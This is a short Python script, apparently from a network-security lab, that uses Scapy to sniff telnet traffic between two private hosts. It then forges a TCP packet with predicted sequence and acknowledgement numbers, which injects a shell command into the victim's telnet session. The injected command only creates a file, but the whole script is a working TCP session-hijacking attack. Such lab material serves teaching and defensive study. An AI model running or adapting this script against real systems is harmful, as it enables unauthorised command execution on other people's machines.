#!/usr/bin/env python3
from scapy.all import *


def hijack(pkt):
    VICTIM = "10.9.0.5"
    HOST_WITH_TELNET_CLIENT = "10.9.0.6"
    
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    
    newseq = old_tcp.seq + 10
    newack = old_tcp.ack + 1
    ip = IP(src=HOST_WITH_TELNET_CLIENT, dst=VICTIM)
    tcp = TCP(
        sport=old_tcp.sport, 
        dport=23, 
        flags="A", 
        seq=newseq, 
        ack=newack
    )
    
    # Create a file on a victim
    data = "\ntouch /tmp/xyz\n" 
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt, verbose=0)
    quit()


myFilter = 'tcp and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23'

sniff(filter=myFilter, prn=hijack, store=0, iface="br-4b40c97b1673", promisc=True)

